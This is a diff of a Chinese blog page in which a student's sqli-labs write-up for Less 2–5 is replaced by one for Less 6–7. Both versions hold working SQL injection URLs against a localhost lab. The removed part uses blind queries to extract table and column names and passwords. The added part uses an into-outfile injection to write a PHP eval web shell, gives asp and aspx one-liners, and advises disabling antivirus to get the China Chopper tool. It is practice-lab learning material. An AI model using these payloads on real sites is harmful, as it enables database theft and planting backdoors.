@@ -10,7 +10,7 @@
   
   <title>
     
-      sqli-labs-Less2~5 | Hexo
+      sqli-labs-Less6~7 | Hexo
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -192,8 +192,8 @@
 </header>
 
     <div id="article-banner">
-  <h2>sqli-labs-Less2~5</h2>
-  <p class="post-date">2021-10-06</p>
+  <h2>sqli-labs-Less6~7</h2>
+  <p class="post-date">2021-10-12</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
   </div>
@@ -201,73 +201,59 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><p>通过反复的学习和尝试Less1-4的课程，我们对SQL注入有了更深刻的了解，这篇博客我们分为两个内容，一是整理sql注入的几种方法，二是介绍Less5的学习过程。</p>
+    <section class="markdown-content"><p>再接再厉，本期博客记录着我们又学到新知识和新工具，以下是关于Less6~7的相关内容。</p>
 <span id="more"></span>
-<h3 id="SQL注入问题">SQL注入问题</h3>
-<p>Less1我们通过注入?id=1’回显出用户名和密码，但是当用同样的方法注入Less2时，却出现报错–<img src="/2021/10/06/sqli-labs-Less2-5/less%E5%88%86%E5%8F%B7%E9%97%AE%E9%A2%98.png" alt></p>
-<p>说明Less2的注入方法有别于Less1，通过提示，去掉分号之后回显正常，其余的操作就和Less1大致相同。</p>
-<p>接着学习Less3，当我们分别尝试Less1和Less2的注入方法之后，发现都不会回显，说明注入的方式又有所改变，这时候的注入为?id=1’)，需要加上括号，发现回显成功。</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/sql%E6%B3%A8%E5%85%A52.png" alt></p>
-<p>Less4的注入为?id=1&quot;)，通过提示和试错便可得出，这里不过多赘述，需要注意的是，大多数情况中我们输入?id=1回显成功后却无法进一步查列等，就如下面这组图片所示。</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/sql%E4%B8%AD%E5%9B%9E%E6%98%BE4.1.png" alt></p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/sql%E4%B8%AD%E5%9B%9E%E6%98%BE4.2.png" alt></p>
-<p>仔细对比发现，区别就在于SQL注入，所以我们要学会根据sql的提示判断。</p>
-<p>补充一点，插入sql语句的方法，在index.php中插入如下语句</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/QQ%E6%88%AA%E5%9B%BE20211006193127.png" alt></p>
-<p><strong>br</strong>起到换行的左右，参考HTML语法，使用时注意格式</p>
-<p>–+为GET请求用来注释后面的部分代码，帮助回显信息</p>
-<h3 id="Less5的学习">Less5的学习</h3>
-<p>首先我们根据往常的经验照常注入**?id=1**之类的，发现没有报错，并回显出You are in…</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/Bool.png" alt></p>
-<p>这里我们会产生疑惑，为什么会是You are in… 而不是像之前的回显出名称和密码，带着这个疑惑我们接着进入查列步骤。</p>
-<p>继而发现查第三列及以下回显You are in… ，而第四列及以上则出现报错。这时候我们不难理解，You are in… 说明我们查询的数据是正确的，并且知道Less5就是通过只回显You are in… 来执行操作。所以以下的步骤就是奥通过是否回显出You are in… 来证明我们的操作判断正确与否。</p>
-<p>下一步就是查库，假设我们现在不知道数据库是<strong>security</strong>，那我们要执行什么样的操作来正确查找呢。这里就要先介绍几个函数。</p>
-<h4 id="left函数">left函数</h4>
-<p>left()函数：<strong>select left(database(),1)=‘’；</strong> // left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回会0 ——这是在mysql终端中，举个例子：</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/QQ%E6%88%AA%E5%9B%BE20211009000602.png" alt></p>
-<p>当然，前面需要先选择数据库，这里是**use security；**除此之外，left函数也可以用于查询其他方面。</p>
-<p>然后在URl上，使用left函数判断则是：</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/left%E5%87%BD%E6%95%B01.png" alt></p>
-<p>代码是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqil-labs-master/Less-5/?id=1&#x27;and left((select database()),2)=&#x27;se&#x27;</span><br></pre></td></tr></table></figure>
-<p>这里列举查询前两位，You are in…说明正确，也可以借助left函数查询字符的任意位置及字母数。</p>
-<h4 id="length函数">length函数</h4>
-<p>length()函数：用来判断所要找的数据的字符串长度。比如我现在查询数据库的长度为8时回显出You are in… 证明该数据库长度为8（符合<strong>security</strong>）。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqil-labs-master/Less-5/?id=1&#x27;and length(database())=&#x27;8&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/%E9%95%BF%E5%BA%A6.png" alt></p>
-<h4 id="substr函数">substr函数</h4>
-<p>substr(str,pos,len):从pos位置开始，截取len个字符。</p>
-<p>有分割的意思，上面举例都是查库，这里我们用substr查表试试。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqli-labs-master/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/e.png" alt></p>
-<p>这里是查询<strong>security</strong>中第一个表的第一个字符，我们知道security的第一个表是<strong>emails</strong>，显而易见第一个字符是<strong>e</strong>，与我们输入的代码相符，故而回显正确，其他的也可通过这个方式。</p>
-<p>limit x,y 查询指定的数据库，其中x和y都表示数字，意思是查询从x开始y个数据库，起始为0。</p>
-<p>当然，在猜测正确的前提下，也可以不一一查询字符，可以直接查表。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqli-labs-master/Less-5/?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 0,1)=&#x27;emails&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/emails.png" alt></p>
-<p>其余的表也可按照这样查询，最后我们知道共有四个表，分别是：<strong>emails,referers,uagents,users</strong></p>
-<p>这个可以在MySQL终端尝试select table_name from information_schema.tables where table_schema=‘security’;</p>
-<p>查表完后下一步是查列，这里我们查询<strong>users</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqli-labs-master/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;  limit 0,1),1,2)=&#x27;id&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/12.png" alt></p>
-<p>得到字段：<strong>id，username，password</strong></p>
-<p>最后查询账号密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqli-labs-master/Less-5/?id=1&#x27; and (select password from users where id=1)=&#x27;dumb&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>这里密码和账号一样，都是<strong>dumb</strong>。</p>
-<p>以上的步骤，是我们在已知库名等条件下做的，可以看出，即使是在知道的前提下，都这么的繁琐，那要是在一无所知猜测的情况，工作得繁琐到什么程度，所以，以上的方法要会，但不建议用。</p>
-<h4 id="BurpSuite">BurpSuite</h4>
-<p>下面，我们采用<strong>BurpSuite</strong>爆破的形式，下载和代理浏览器的方法百度。</p>
-<p>我们率先爆破数据库。</p>
-<p>代理浏览器选择<strong>拦截请求（intercept is on）</strong>，截断数据后右键选择</p>
-<p><strong>发送给lntruder</strong>，后续会出现这样的画面。</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/QQ%E6%88%AA%E5%9B%BE20211008223034.png" alt></p>
-<p>首先清楚参数，然后选择字符添加参数。</p>
-<p>接着在<strong>有效载荷</strong>里选择<strong>蛮力</strong>，根据所需情况设定</p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/QQ%E6%88%AA%E5%9B%BE20211008223113.png" alt></p>
-<p>设定完成后点击<strong>攻击</strong></p>
-<p><img src="/2021/10/06/sqli-labs-Less2-5/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.png" alt></p>
-<p>长度比较短的就是所要查询的字符，这里是第一个，可以在<strong>响应</strong>看到You are in…</p>
-<p>查表和查列等也可以借助这个工具，这里就不一一演示，相比之下，你会发现使用BurpSuite会比使用函数更快，也更有针对性，所以建议使用。当然，<strong>sqlmap</strong>也是一个不错的选择。</p>
+<h4 id="Less6">Less6</h4>
+<p>Less6与Less5同属于<strong>Bool型盲注</strong>，布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息。</p>
+<p>Less5已经对所需使用的函数有了大致的解释，我在这里做了一个简单的整理。</p>
+<p>1、left()函数：<strong>select left(database(),1)=‘’；</strong> // left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回会0</p>
+<p>2、regexp函数：<strong>select user() regexp ‘r’；</strong> // user()的结果是root，regexp为匹配root的正确表达式</p>
+<p>3、like函数：<strong>select user() like ‘r%’；</strong> // 匹配与regexp相似，区别是后面加个%</p>
+<p>4、substr(a,b,c) <strong>select substr(a,b,c)=‘’；</strong> substr(a,b,c)从位置b开始，截取a字符串c位长度</p>
+<p>5、ascii <strong>select ascii (‘’)；</strong> // 将某个字符串转化为ascii值</p>
+<p>6、<strong>chr(数字)</strong> 或者是<strong>ord(‘字母’)；</strong> // 使用python中的两个函数可以判断当前的ascil值是多少</p>
+<p>7、<strong>length(database())=‘’</strong> // 判断数据库字符串长度</p>
+<p>8、<strong>limit x,y</strong> 查询指定的数据库，其中x和y都表示数字，意思是查询从x开始y个数据库，起始为0.</p>
+<p>另外在加入一个新的方法，<strong>二分法</strong></p>
+<p>我们以Less6为对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1%27and%20ascii(substr((select%20schema_name%20from%20information_schema.schemata%20limit%205,1)1,1))%3E100--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/12/sqli-labs-Less6-7/ascii.png" alt></p>
+<p>其实就是通过ascii实现数字与英文的编码转化，这里是对查库的举例，后续步骤雷同。</p>
+<h4 id="ASCII码表">ASCII码表</h4>
+<p><img src="/2021/10/12/sqli-labs-Less6-7/ascii%E7%A0%81%E8%A1%A8.png" alt></p>
+<p>这只是现阶段学习所需的一部分，完整的话<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII/309296">ASCII_百度百科 (baidu.com)</a></p>
+<p>我们也可以在mysql终端实现码表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
+<h4 id="Less7">Less7</h4>
+<p>在开始Less7的内容之前，我们再一次来理解SQL注入的内涵。</p>
+<p>首先，这里有一个小技巧，我们可以通过测试?id='来判断是否存在SQL注入。如果提示<strong>You have an error in your SQL syntax</strong>，那么就说明存在SQL注入。</p>
+<h5 id="1、测试注入点，对id语句进行猜测："><strong>1、测试注入点，对id语句进行猜测：</strong></h5>
+<p>单引号测试： id?=1’–+ 数据库报错<br>
+双引号测试： id=?1&quot; --+ 页面正常显示<br>
+通过这两条信息的对比，单引号是闭合条件之一</p>
+<p>带着单引号 ’ 继续猜测<br>
+单引号+括号测试： ?id=1’) --+ 数据库报错<br>
+单引号+双括号测试： ?id=1’)) --+ 页面正常显示<br>
+这里我们测试出了正确的闭合语句，<br>
+可以推断出后端的SQL语句大概是 select * from users where id = ((‘$id’))<br>
+(注释：这里直接猜测 单引号后面加上括号，是由于php脚本语言，能识别的解析变量的字比较少，主要就是 单引号、双引号、括号等)</p>
+<h5 id="2、into-outfile">2、into outfile</h5>
+<p>我们注入正确后，会看到画面出现如下：</p>
+<p><img src="/2021/10/12/sqli-labs-Less6-7/1433223.png" alt></p>
+<p>这就是导出文件字符型注入，所以这是要就很有必要先学习文件字符</p>
+<p>into outfile 写文件<br>
+用法：select’内容’into outfile ‘位置’; // 记得\<br>
+load_file() 读取本地文件<br>
+用法：select load_file(‘位置’);</p>
+<h5 id="3、通过导出文件获取数据库信息">3、通过导出文件获取数据库信息</h5>
+<p>这时候我们需要<strong>一句话木马</strong>和<strong>中国菜刀</strong>，前者是木马语言，后者是黑客工具。（注意：下载中国菜刀请先关闭安全程序，尤其是电脑自带的）</p>
+<p>php的一句话木马： <?php @eval($_POST['pass']);?><br>
+asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>
+aspx的一句话是：  &lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Request.Item[“pass”],“unsafe”);%&gt;</p>
+<p>操作流程：1.结合union联合查询语句将查询到的信息导入到一个文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-7/?id=1%27))%20union%20select%201,2,%27%3C?php%20@eval($_POST[%27chopper%27]);?%3E%27%20into%20outfile%20%22C:\\wamp.64\\www\\sqli-labs-master\\Less-7\\1.php%22--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/12/sqli-labs-Less6-7/%E6%84%8F%E5%A4%96.png" alt></p>
+<p>2、用中国菜刀访问，因为存在一句话木马，所以输入localhost/sqil-labs-master/Less-7/1.php即可。</p>
 </section>
     <!-- Tags START -->
     
@@ -277,20 +263,13 @@
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-      <a class="nav-left" href="/2021/10/04/sqli-labs-Less1/">
+      <a class="nav-left" href="/2021/10/06/sqli-labs-Less2-5/">
         <span class="nav-arrow">← </span>
         
-          sqli-labs_Less1
+          sqli-labs-Less2~5
         
       </a>
     
-    
-      <a class="nav-right" href="/2021/10/12/sqli-labs-Less6-7/">
-        
-          sqli-labs-Less6~7
-        
-        <span class="nav-arrow"> →</span>
-      </a>
     
   </div>
 
@@ -342,7 +321,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98"><span class="toc-nav-text">SQL注入问题</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Less5%E7%9A%84%E5%AD%A6%E4%B9%A0"><span class="toc-nav-text">Less5的学习</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#left%E5%87%BD%E6%95%B0"><span class="toc-nav-text">left函数</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#length%E5%87%BD%E6%95%B0"><span class="toc-nav-text">length函数</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#substr%E5%87%BD%E6%95%B0"><span class="toc-nav-text">substr函数</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#BurpSuite"><span class="toc-nav-text">BurpSuite</span></a></li></ol></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less6"><span class="toc-nav-text">Less6</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#ASCII%E7%A0%81%E8%A1%A8"><span class="toc-nav-text">ASCII码表</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less7"><span class="toc-nav-text">Less7</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#1%E3%80%81%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E5%AF%B9id%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E7%8C%9C%E6%B5%8B%EF%BC%9A"><span class="toc-nav-text">1、测试注入点，对id语句进行猜测：</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#2%E3%80%81into-outfile"><span class="toc-nav-text">2、into outfile</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#3%E3%80%81%E9%80%9A%E8%BF%87%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-nav-text">3、通过导出文件获取数据库信息</span></a></li></ol></li></ol>
     
   </div>
 </aside>
@@ -352,7 +331,7 @@
 
 <script>
   (function () {
-    var url = 'http://example.com/2021/10/06/sqli-labs-Less2-5/';
+    var url = 'http://example.com/2021/10/12/sqli-labs-Less6-7/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
